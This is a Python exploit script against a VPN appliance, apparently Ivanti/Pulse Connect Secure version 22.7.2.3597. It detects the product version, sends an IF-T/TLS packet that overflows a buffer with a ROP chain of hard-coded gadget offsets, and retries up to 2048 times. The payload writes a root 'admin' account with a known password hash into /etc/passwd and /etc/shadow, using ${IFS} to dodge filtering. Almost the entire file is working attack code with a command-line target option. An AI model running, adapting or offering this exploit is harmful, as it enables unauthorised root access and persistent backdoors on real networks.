import sys
import socket
import ssl
import struct
import argparse
import requests
import re
from time import sleep

requests.packages.urllib3.disable_warnings()

def log(txt):
    print(txt)

def get_productversion(ip, port):
    try:
        url = f"https://{ip}:{port}/dana-na/auth/url_admin/welcome.cgi?type=inter"
        response = requests.get(url, verify=False, timeout=10)
        if response.status_code == 200:
            match = re.search(r'name="productversion"\s+value="(\d+\.\d+\.\d+\.\d+)"', response.text)
            if match:
                return match.group(1)
    except Exception as e:
        log(f"[-] Version detection failed: {str(e)}")
    return None

def exploit(target_ip, target_port):
    log(f"[+] Targeting {target_ip}:{target_port}")

    product_version = get_productversion(target_ip, target_port)
    if not product_version:
        log("[-] Failed to detect product version")
        return

    log(f"[+] Detected version {product_version}")

    targets = {
        '22.7.2.3597': {
            'padding_to_vftable': 2288,
            'vftable_gadget_offset': 0x00934365 + 2,
            'padding_to_next_frame': 2934,
            'offset_to_got_plt': 0x00157c000,
            'gadget_inc_ebx_ret': 0x01338373,
            'gadget_mov_eax_esp_retn_c': 0x00ca2e84,
            'gadget_add_eax_8_ret': 0x007a040c,
            'gadget_mov_esp_eax_call_system': 0x004f0df3,
            'libdsplibs_base': 0xf6492000,
        }
    }

    target = targets.get(product_version)
    if not target:
        log(f"[-] No target configuration for version {product_version}")
        return

    cmd = (
        "echo 'admin:$1$salt$uDqIznLh7hN0FJZ5cW5vJ0:0:0::0:0:Admin:/:/bin/bash' >> /etc/passwd; "
        "echo 'admin:$1$salt$uDqIznLh7hN0FJZ5cW5vJ0:19157:0:99999:7:::' >> /etc/shadow; #"
    )
    cmd = cmd.replace(' ', '${IFS}')

    attempt = 0
    for _ in range(2048):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)

            if target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ssock = ctx.wrap_socket(sock, server_hostname=target_ip)
                ssock.connect((target_ip, target_port))
            else:
                sock.connect((target_ip, target_port))
                ssock = sock

            http_req = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_ip}:{target_port}\r\n"
                "User-Agent: AnyConnect-compatible OpenConnect VPN Agent v9.12-188-gaebfabb3-dirty\r\n"
                "Content-Type: EAP\r\n"
                "Upgrade: IF-T/TLS 1.0\r\n"
                "Content-Length: 0\r\n"
                "\r\n"
            )
            ssock.send(http_req.encode())

            response = ssock.recv(4096)
            if b'101 Switching Protocols' not in response:
                log("[-] Failed to switch protocols")
                continue

            version_data = struct.pack('4B', 0, 1, 2, 2)
            version_pkt = (
                struct.pack('>4I',
                    0x00005597,    # VENDOR_TCG
                    0x00000001,    # IFT_VERSION_REQUEST
                    len(version_data) + 16,
                    0              # seq id
                ) + version_data
            )
            ssock.send(version_pkt)

            buffer = b'C' * target['padding_to_vftable']
            buffer += struct.pack('<I', target['libdsplibs_base'] + target['vftable_gadget_offset'])
            buffer += b'A' * target['padding_to_next_frame']
            buffer += struct.pack('<I', target['libdsplibs_base'] + target['offset_to_got_plt'] - 1)
            buffer += struct.pack('<4I', 0xCAFEBEEF, 0xCAFEBEEF, 0xCAFEBEEF, 0xCAFEBEEF)
            buffer += struct.pack('<I', target['libdsplibs_base'] + target['gadget_inc_ebx_ret'])
            buffer += struct.pack('<I', target['libdsplibs_base'] + target['gadget_mov_eax_esp_retn_c'])
            buffer += struct.pack('<I', target['libdsplibs_base'] + target['gadget_add_eax_8_ret'])
            buffer += struct.pack('<3I', 0xCAFEBEEF, 0xCAFEBEEF, 0xCAFEBEEF)
            buffer += struct.pack('<4I',
                target['libdsplibs_base'] + target['gadget_add_eax_8_ret'],
                target['libdsplibs_base'] + target['gadget_add_eax_8_ret'],
                target['libdsplibs_base'] + target['gadget_add_eax_8_ret'],
                target['libdsplibs_base'] + target['gadget_add_eax_8_ret']
            )
            buffer += struct.pack('<I', target['libdsplibs_base'] + target['gadget_mov_esp_eax_call_system'])
            buffer += struct.pack('<I', 0xCAFEBEEF)
            buffer += cmd.encode() + b'\x00'

            attempt += 1
            log(f"[*] Sending exploit attempt #{attempt}")

            exploit_data = f"clientHostName=abcdefgh clientIp=127.0.0.1 clientCapabilities={buffer.decode(errors='ignore')}\n\x00"
            exploit_pkt = (
                struct.pack('>4I',
                    0x00000a4c,    # VENDOR_JUNIPER
                    0x00000088,    # ?
                    len(exploit_data) + 16,
                    1              # seq id
                ) + exploit_data.encode()
            )
            ssock.send(exploit_pkt)

            sleep(1)
            ssock.close()

        except Exception as e:
            log(f"[-] Error: {str(e)}")
            sleep(1)
            continue

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=443, help="Target port")
    args = parser.parse_args()

    exploit(args.target, args.port)
    log("[+] Exploit attempt completed. Try logging in with username 'admin' and password 'password'")